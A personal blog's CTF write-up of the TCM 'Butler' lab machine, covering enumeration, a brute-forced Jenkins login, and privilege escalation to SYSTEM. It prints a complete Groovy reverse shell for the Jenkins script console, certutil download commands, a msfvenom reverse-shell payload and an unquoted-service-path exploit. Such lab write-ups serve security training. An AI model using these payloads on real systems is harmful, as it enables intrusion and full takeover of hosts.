---
title: Write-up Butler on TCM
author: eMVee
date: 2022-08-20 21:00:00 +0800
categories: [CTF, TCM]
tags: [PNPT, Unqouted service path]
render_with_liquid: false
---

Butler a vulnerable machine in the Practical Ethical Hacking course from TCM-Academy is wating for me. I am not sure what to expect from this machine. Most of the time I get an impression based on the name of the vulnerable machine what it might be hosting. I had no idea what Butler could be.

## PNPT - Butler writeup

After booting my Kali virtual machine and the vulnerable machine "Butler" in my labenvironment, it was time to run a ping sweep with fping to identify the IP address of the target.
~~~
┌──(emvee㉿kali)-[~/Documents/butler]
└─$ fping 192.168.138.0/24 -ag 2>/dev/null
192.168.138.1
192.168.138.2
192.168.138.3
192.168.138.4
192.168.138.8
~~~
To be sure to see which IP addresses are online in my pentest labenvironment I start another pings sweep with nmap.
~~~
┌──(emvee㉿kali)-[~/Documents/butler]
└─$ nmap -sn -n -T4 192.168.138.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:10 CEST
Nmap scan report for 192.168.138.1
Host is up (0.00068s latency).
Nmap scan report for 192.168.138.4
Host is up (0.00028s latency).
Nmap scan report for 192.168.138.8
Host is up (0.00071s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 3.14 seconds
~~~
It looks like the IP address: **192.168.138.8**, is my target. As usual I copy and paste the IP address into a variable in the CLI.

~~~
┌──(emvee㉿kali)-[~/Documents/butler]
└─$ ip=192.168.138.8 
~~~
As soons as the IP address is set to the variable, I start a port scan to identify open ports and services running on the target.
I love to use a pretty agressive scan during the test I run in my environment.
~~~
┌──(emvee㉿kali)-[~/Documents/butler]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 15:11 CEST
Stats: 0:02:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 15:13 (0:00:09 remaining)
Stats: 0:03:36 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.138.8
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Jetty 9.4.41.v20210516
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.41.v20210516)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:63:79:AF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-19T13:16:02
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BUTLER, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:63:79:af (Oracle VirtualBox virtual NIC)
|_clock-skew: 1m14s

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms 192.168.138.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.73 seconds
~~~
It took a while before nmap finished the scan and showed the results on the sceen. It did find a lot of open ports and services running on the system.
I added the most important of them to my nores.

* Port 135, 137, 445
    * SMB
    * Netbios name: BUTLER
    * Singing enabled, but not required
* Port 8080
    * HTTP
    * Jetty 9.4.41.v20210516
* Running probably on Microsoft Windows 10

It looks like the system is running on a Microsoft Windows 10 machine with SMB enabled. This gives me the opportunity to enumerate the system with enum4linux to identify for example, usernams, groups and shares.

~~~
┌──(emvee㉿kali)-[~/Documents/butler]
└─$ enum4linux $ip                                  
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Aug 19 15:21:15 2022

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                           
Target ........... 192.168.138.8                                                                                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.138.8 )===========================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[+] Got domain/workgroup name: WORKGROUP                                                                                                                                                                                                   
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
 ===============================( Nbtstat Information for 192.168.138.8 )===============================
                                                                                                                                                                                                                                           
Looking up status of 192.168.138.8                                                                                                                                                                                                         
        BUTLER          <20> -         B <ACTIVE>  File Server Service
        BUTLER          <00> -         B <ACTIVE>  Workstation Service
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

        MAC Address = 08-00-27-63-79-AF

 ===================================( Session Check on 192.168.138.8 )===================================
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.   
~~~
It did not return that muuch information, so I would love to try smbclient as well.
~~~
┌──(emvee㉿kali)-[~]
└─$ smbclient -L $ip
Password for [WORKGROUP\emvee]:
session setup failed: NT_STATUS_ACCESS_DENIED
~~~
To bad, this scan did not give me any additional information what I could use. On port 8080 a HTTP service was running. Not sure what to expect there I started running nikto against this service.
~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.138.8
+ Target Hostname:    192.168.138.8
+ Target Port:        8080
+ Start Time:         2022-08-19 15:33:25 (GMT2)
---------------------------------------------------------------------------
+ Server: Jetty(9.4.41.v20210516)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'x-jenkins' found, with contents: 2.289.3
+ Uncommon header 'x-hudson' found, with contents: 1.395
+ Uncommon header 'x-jenkins-session' found, with contents: 0afdecaa
+ All CGI directories 'found', use '-C none' to test none
+ Uncommon header 'x-instance-identity' found, with contents: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw43hS+kkhDV0LAwc2YVGFglH5IN1zZfBknSOOnM8uzQe2KSrC0PdLp+bTTNiK80Ill04oLGN5LBVAxwJ0koN0X2FPwGLqM6lJQlw9sESCUK0r6SfyTJJMZbsMaUKgwSFePnEbbheH4tPmNxGtI71812KggjsT22Oi5jKHv3rt2OM3dTa4Ma6jwLwke1Iz/rIYmRuW2pUanPVvyg7V2ZiWfqkMkWWs0WN9Y1MnGfyDrIGMYlDIFDZ1w2J25tBTzCR/tWMXOzyZh34hsbZX8a1bzFa7q+DsfL0D/hdDIG6pOuBO8JhffUsKe7qr4Xp2HQ1z/3AQLo4xYq8ojWOq7xX6wIDAQAB
+ Uncommon header 'x-hudson-theme' found, with contents: default
+ Uncommon header 'cross-origin-opener-policy' found, with contents: same-origin
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
+ Scan terminated:  20 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-08-19 15:34:47 (GMT2) (82 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~

Sometimes Nikto is running and running and I have to wait a while. This time Nikto finished the scan pretty quick, still it was 82 seconds but there are moment it take minutes.
Based on the scan results I could not tell what I should expect and what I should exploit. It was time to open the browser and navigate to the website.


![Image](/assets/img/WriteUp/PNPT/Butler/1.png){: width="700" height="400" }

Okay, that makes sense why the machine is called "Butler". There is a Jenkins website running on this machine.
I decided to use Burp Suite to intercept the request so I could use it with the Intruder functionality.

![Image](/assets/img/WriteUp/PNPT/Butler/2.png){: width="700" height="400" }

After sending it to the Intruder I had to assign the fields where the usernames and passwords should be filled from a list.


![Image](/assets/img/WriteUp/PNPT/Butler/3.png){: width="700" height="400" }

First I load the usernames into the list.


![Image](/assets/img/WriteUp/PNPT/Butler/4.png){: width="700" height="400" }

The second one is used to load passwords. Now I can start the attack and wait for the results.


![Image](/assets/img/WriteUp/PNPT/Butler/5.png){: width="700" height="400" }

The length of the request with the payload "Jenkins:Jenkins" differs from the other responses. This should be the valid credentials to gain access to Jenkins.
Let's try those credentials.
 
![Image](/assets/img/WriteUp/PNPT/Butler/6.png){: width="700" height="400" }

It worked to gains access to Jenkins with the username Jenkins and password Jenkins. Since I don't know much about Jenkins I had to do a bit of research. 
With help of a little Google Fu -> [pwning jenkins](https://www.google.com/search?q=pwning+jenkins) a great resource about Jenkins can be found. This [Github from gquere](https://github.com/gquere/pwn_jenkins) even explains how to set up a reverse shell within Jenkins. And if we search further on "[hacking jenkins](https://www.google.com/search?q=hacking+jenkins)" we come to [HackTricks](https://book.hacktricks.xyz/cloud- security/jenkins). This webpage has been in my favorite notes for a long time because it's a great resource for during your penetration test or during a CTF. On the Githubpage, I saw a Groovy reverse shell and on the hacktrickz there is something to read about how to run a Groovy script.... Time to investigate this further and try it.

In the Dashboard of Jenkins I see a button "Manage Jenkins", this triggers me to take a look. Because maybe I can set or configure something here, I suspect. When I open it I scroll down and see some interesting options like Jenkins VLI and Script Console.


![Image](/assets/img/WriteUp/PNPT/Butler/7.png){: width="700" height="400" }

First, I'll take a look at the Jenkins CLI to see what I could do with it.
![Image](/assets/img/WriteUp/PNPT/Butler/8.png){: width="700" height="400" }

Unfortunately, this doesn't seem like something I can run my commands right now, so I'll save this option for later if the Script Console also fails.
![Image](/assets/img/WriteUp/PNPT/Butler/9.png){: width="700" height="400" }

The script console seems like something I can use because I can run Groovy script on the server. I saw the reverse shell example in Groovy on the Github page. Then all I have to do is start a listener on my Kali and modify the script and click Run.

Groovy reverse shell script for Windows
~~~
String host="192.168.138.4";
int port=4321;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

~~~


I start my netcat listener after modifying the script.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321            
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321

~~~

I click on Run in the browser to spawn a reverse shell.
![Image](/assets/img/WriteUp/PNPT/Butler/10.png){: width="700" height="400" }

After clicking Run, I see that the browser continues to load. A good sign, because then a reverse shell should have been set up. I switch to my CLI and see that I a connection has been established.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 4321            
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4321
Ncat: Listening on 0.0.0.0:4321
Ncat: Connection from 192.168.138.8.
Ncat: Connection from 192.168.138.8:49720.
Microsoft Windows [Version 10.0.19043.1889]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Jenkins>

~~~
Now let's find out who I am on the machine.
~~~
C:\Program Files\Jenkins>whoami
whoami
butler\butler
~~~~ 
It looks I am the user "butler", but I have no idea on what kind of Operating System I am working.

~~~
C:\Program Files\Jenkins>systeminfo
systeminfo

Host Name:                 BUTLER
OS Name:                   Microsoft Windows 10 Enterprise Evaluation
OS Version:                10.0.19043 N/A Build 19043
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          butler
Registered Organization:   
Product ID:                00329-20000-00001-AA079
Original Install Date:     8/14/2021, 3:51:38 AM
System Boot Time:          8/23/2022, 12:19:41 AM
System Manufacturer:       innotek GmbH
System Model:              VirtualBox
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 158 Stepping 10 GenuineIntel ~2592 Mhz
BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,035 MB
Available Physical Memory: 930 MB
Virtual Memory: Max Size:  3,187 MB
Virtual Memory: Available: 2,122 MB
Virtual Memory: In Use:    1,065 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 6 Hotfix(s) Installed.
                           [01]: KB5015730
                           [02]: KB5000736
                           [03]: KB5012170
                           [04]: KB5016616
                           [05]: KB5015895
                           [06]: KB5001405
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     192.168.138.3
                                 IP address(es)
                                 [01]: 192.168.138.8
                                 [02]: fe80::55b9:d250:339:ffb0
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

~~~
It looks I am working on a Windows 10 Enterprise version and there are some hotfixes installed on the system.
I opened a new shell in my **~/transfer** directory to host a Python web server. This would give me the possibility to host files, so I am able to download them on the target.
~~~
┌──(emvee㉿kali)-[~/transfer]
└─$ ls                                 
LinEnum  linpeas.sh  PEASS-ng  pspy64  winPEASx64.exe
                                                                                                                                                                                                                                            
┌──(emvee㉿kali)-[~/transfer]
└─$ sudo python3 -m http.server 80     
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

~~~
To download a file on the Windows target, it is possible to use the certutil tool, which most of the time is available on a Windows machine. The command that I use looks like this: **certutil.exe -urlcache -f http://192.168.138.4/winPEASx64.exe winPEASx64.exe**


~~~
C:\Program Files\Jenkins>certutil.exe -urlcache -f http://192.168.138.4/winPEASx64.exe winPEASx64.exe
certutil.exe -urlcache -f http://192.168.138.4/winPEASx64.exe winPEASx64.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
~~~


Let's start winpeas to see what I can use to escalate my privileges
~~~
C:\Program Files\Jenkins>winPEASx64.exe
winPEASx64.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
               ((((((((((((((((((((((((((((((((
        (((((((((((((((((((((((((((((((((((((((((((
      ((((((((((((((**********/##########(((((((((((((   
    ((((((((((((********************/#######(((((((((((
    ((((((((******************/@@@@@/****######((((((((((
    ((((((********************@@@@@@@@@@/***,####((((((((((
    (((((********************/@@@@@%@@@@/********##(((((((((
    (((############*********/%@@@@@@@@@/************((((((((
    ((##################(/******/@@@@@/***************((((((
    ((#########################(/**********************(((((
    ((##############################(/*****************(((((
    ((###################################(/************(((((
    ((#######################################(*********(((((
    ((#######(,.***.,(###################(..***.*******(((((
    ((#######*(#####((##################((######/(*****(((((
    ((###################(/***********(##############()(((((
    (((#####################/*******(################)((((((
    ((((############################################)((((((
    (((((##########################################)(((((((
    ((((((########################################)(((((((
    ((((((((####################################)((((((((
    (((((((((#################################)(((((((((
        ((((((((((##########################)(((((((((
              ((((((((((((((((((((((((((((((((((((((
                 ((((((((((((((((((((((((((((((

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                                                                                                                                                                       
                                                                                                                                                                                                                                            
  WinPEAS-ng by @carlospolopm                                                                                                                                                                                                               

       /---------------------------------------------------------------------------------\                                                                                                                                                  
       |                             Do you like PEASS?                                  |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                                                                                  
       |         Follow on Twitter         :     @carlospolopm                           |                                                                                                                                                  
       |         Respect on HTB            :     SirBroccoli                             |                                                                                                                                                  
       |---------------------------------------------------------------------------------|                                                                                                                                                  
       |                                 Thank you!                                      |                                                                                                                                                  
       \---------------------------------------------------------------------------------/                                                                                                                                                  
                                                                                                                                                                                                                                            
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

< ---- SNIP ---- >

~~~
At the top (beginning) of the results of linPEAS, it indicates with a kind of legend what to look for.
~~~
����������͹ Display information about local users
   Computer Name           :   BUTLER
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   8/15/2021 7:27:25 PM
   Logons Count            :   10
   Password Last Set       :   8/14/2021 5:26:01 AM

   =================================================================================================

   Computer Name           :   BUTLER
   User Name               :   butler
   User Id                 :   1001
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   
   Last Logon              :   8/23/2022 9:19:51 AM
   Logons Count            :   29
   Password Last Set       :   8/14/2021 5:06:17 AM

~~~
While linPEAS was running, I noticed two users which I added to my notes.
~~~
�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    Jenkins(CloudBees, Inc. - Jenkins)["C:\Program Files\Jenkins\jenkins.exe"] - Auto - Running - isDotNet
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: butler [AllAccess], Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\Jenkins (Administrators [AllAccess], butler [AllAccess])
    Jenkins Automation Server
   =================================================================================================                                                                                                                                        

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    YOU CAN MODIFY THIS SERVICE: Start, AllAccess
    Possible DLL Hijacking in binary folder: C:\Windows\System32\OpenSSH (Administrators [WriteData/CreateFiles])
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                                                                                        

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware VGAuth (Administrators [AllAccess])
    Alias Manager and Ticket Service
   =================================================================================================                                                                                                                                        

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools (Administrators [AllAccess])
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================                                                                                                                                        

    VMwareCAFCommAmqpListener(VMware CAF AMQP Communication Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\CommAmqpListener.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin (Administrators [AllAccess])
    VMware Common Agent AMQP Communication Service
   =================================================================================================                                                                                                                                        

    VMwareCAFManagementAgentHost(VMware CAF Management Agent Service)["C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin (Administrators [AllAccess])
    VMware Common Agent Management Agent Service
   =================================================================================================                                                                                                                                        

    WiseBootAssistant(WiseCleaner.com - Wise Boot Assistant)[C:\Program Files (x86)\Wise\Wise Care 365\BootTime.exe] - Auto - Running - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Administrators [AllAccess]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\Wise\Wise Care 365 (Administrators [AllAccess])
    In order to optimize system performance,Wise Care 365 will calculate your system startup time.
   =================================================================================================    
 
   
Scheduled applications --non microsoft--

����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (Lespeed Ltd.) Wise Care 365.job: C:\Program Files (x86)\Wise\Wise Care 365\WiseTray.exe -StartTray
    Permissions file: Administrators [AllAccess]
    Permissions folder(DLL Hijacking): Administrators [AllAccess]
    Trigger: At log on of any user
   =================================================================================================

    (Lespeed Ltd.) Wise Turbo Checker.job: C:\Program Files (x86)\Wise\Wise Care 365\WiseTurbo.exe 
    Permissions file: Administrators [AllAccess]
    Permissions folder(DLL Hijacking): Administrators [AllAccess]
    Trigger: At 5:35 AM every day
   =================================================================================================

~~~
It looks like there is an " Unqoute Service Path" vulnerability at the Wise Boot Assistent.

Now it is time to create a reverse shell payload with msfvenom. The output I will save to "wise.exe". This is the file name which the service is looking for, so I only have to transfer this file to the target and place it in the first directory where it will look for the file.
~~~
┌──(emvee㉿kali)-[~/transfer]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.138.4 LPORT=9876 -f exe -o wise.exe   
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::NAME
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:11: warning: previous definition of NAME was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::PREFERENCE
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:12: warning: previous definition of PREFERENCE was here
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: already initialized constant HrrRbSsh::Transport::ServerHostKeyAlgorithm::EcdsaSha2Nistp256::IDENTIFIER
/usr/share/metasploit-framework/vendor/bundle/ruby/3.0.0/gems/hrr_rb_ssh-0.4.2/lib/hrr_rb_ssh/transport/server_host_key_algorithm/ecdsa_sha2_nistp256.rb:13: warning: previous definition of IDENTIFIER was here
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: wise.exe
~~~
To transfer the file to the target I start a python3 webserver. This makes it possible to download my payload.
~~~
┌──(emvee㉿kali)-[~/transfer]
└─$ sudo python3 -m http.server 80                                                             
[sudo] password for emvee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
Now I can download the file with certutil to the target. The command looks like: **certutil.exe -urlcache -f http://192.168.138.4/wise.exe wise.exe**
~~~
C:\Program Files (x86)\Wise>certutil.exe -urlcache -f http://192.168.138.4/wise.exe wise.exe                                                        
certutil.exe -urlcache -f http://192.168.138.4/wise.exe wise.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Program Files (x86)\Wise>
~~~
As soon as my payload file is downloaded, I need to stop the service and start the service again.
~~~
C:\Program Files (x86)\Wise>sc stop WiseBootAssistant
sc stop WiseBootAssistant

SERVICE_NAME: WiseBootAssistant 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x1388

C:\Program Files (x86)\Wise>sc start WiseBootAssistant
sc start WiseBootAssistant
~~~
After stoping and starting the service, the reverse shell started via the unqouted service path.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9876
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9876
Ncat: Listening on 0.0.0.0:9876
Ncat: Connection from 192.168.138.8.
Ncat: Connection from 192.168.138.8:49700.
Microsoft Windows [Version 10.0.19043.1889]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
~~~
Let's find out who I am on the machine.
~~~
┌──(emvee㉿kali)-[~]
└─$ nc -lvp 9876
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9876
Ncat: Listening on 0.0.0.0:9876
Ncat: Connection from 192.168.138.8.
Ncat: Connection from 192.168.138.8:49700.
Microsoft Windows [Version 10.0.19043.1889]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
~~~
It looks like I am "nt authority\system". This means I own the whole system!